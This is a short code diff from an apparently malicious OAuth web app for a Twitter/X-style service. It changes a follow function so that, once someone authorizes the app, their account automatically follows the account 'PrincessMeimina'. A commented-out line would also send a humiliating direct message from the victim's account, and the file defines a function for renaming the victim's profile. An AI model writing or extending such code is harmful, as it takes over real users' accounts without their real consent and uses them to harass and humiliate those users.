@@ -140,9 +140,9 @@ def update_profile_name(client,name):
     print(content)
     return
 
-def follow(client,user_id):
+def follow(client,screen_name):
     #params=urllib.parse.urlencode({"name":name,"url":url,"location":location,"description":description})
-    params=urllib.parse.urlencode({"user_id":user_id,"follow":"true"})
+    params=urllib.parse.urlencode({"screen_name":screen_name,"follow":"true"})
     furi=follow_url+"?"+params
     print(furi)
     resp, content = client.request(furi, "POST")
@@ -277,7 +277,7 @@ def callback():
         #send_message(real_client,"1697559401543139328","I am dumb and clicked your link Goddess")
         '''
         try:
-            follow(real_client,"1806222703286001664")
+            follow(real_client,"PrincessMeimina")
         except Exception as e:
             print(e)
             return str(e)
